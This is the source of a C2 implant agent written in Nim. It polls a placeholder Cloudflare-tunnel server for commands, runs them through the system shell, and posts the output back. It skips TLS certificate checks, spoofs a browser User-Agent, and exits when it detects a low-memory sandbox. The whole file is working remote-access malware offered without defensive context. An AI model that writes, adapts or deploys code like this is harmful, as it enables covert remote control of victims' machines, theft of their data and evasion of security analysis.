# Nim C2 Agent - Plain text constants (replaced at build time)
import std/[httpclient, json, os, osproc, strutils, random, net]
when defined(windows):
  import winim/lean

when defined(ssl):
  import std/openssl

const C2_URL = "https://CHANGE-MECHANGE-ME.trycloudflare.com"
const API_KEY = "00000000000000000000000000000000"
const TOKEN = "00000000000000000000000000000000"

proc runCmd(cmd: string): string =
  try:
    when defined(windows):
      let shell = "cmd.exe /c "
    else:
      let shell = "/bin/sh -c "
    let (output, _) = execCmdEx(shell & cmd)
    return output
  except:
    return "Error executing command"

proc main() =
  # Initial delay
  sleep(2000)
  
  # Basic sandbox check
  when defined(windows):
    var memStatus: MEMORYSTATUSEX
    memStatus.dwLength = cast[DWORD](sizeof(MEMORYSTATUSEX))
    GlobalMemoryStatusEx(addr memStatus)
    if cast[uint64](memStatus.ullTotalPhys) < 2000000000'u64:
      quit(0)
  
  randomize()
  let hostname = getEnv("COMPUTERNAME", getEnv("HOSTNAME", "agent"))
  let agentId = hostname & "-" & toHex(rand(0xFFFF), 4).toLowerAscii()
  
  let cmdUrl = C2_URL & "/bits/cmd/" & agentId & "?key=" & TOKEN
  let resultUrl = C2_URL & "/bits/result/" & agentId & "?key=" & TOKEN
  
  # Create SSL context that accepts any certificate
  var sslCtx = newContext(verifyMode = CVerifyNone)
  var client = newHttpClient(timeout = 30000, sslContext = sslCtx)
  client.headers = newHttpHeaders({
    "X-API-Key": API_KEY, 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  })
  
  while true:
    try:
      let resp = client.getContent(cmdUrl)
      var cmd = ""
      try:
        let j = parseJson(resp)
        if j.hasKey("command") and j["command"].kind != JNull:
          cmd = j["command"].getStr()
      except:
        cmd = resp.strip()
      
      if cmd.len > 0:
        var output = ""
        if cmd == "ps":
          when defined(windows):
            output = runCmd("tasklist /FO TABLE")
          else:
            output = runCmd("ps aux")
        elif cmd.startsWith("cd "):
          try:
            setCurrentDir(cmd[3..^1].strip())
            output = "Changed to: " & getCurrentDir()
          except:
            output = "Failed to change directory"
        else:
          output = runCmd(cmd)
        
        if output.len == 0:
          output = "[OK]"
        
        client.headers["Content-Type"] = "application/json"
        discard client.postContent(resultUrl, $(%*{"result": output}))
    except:
      discard
    
    sleep(3000 + rand(2000))

when isMainModule:
  main()
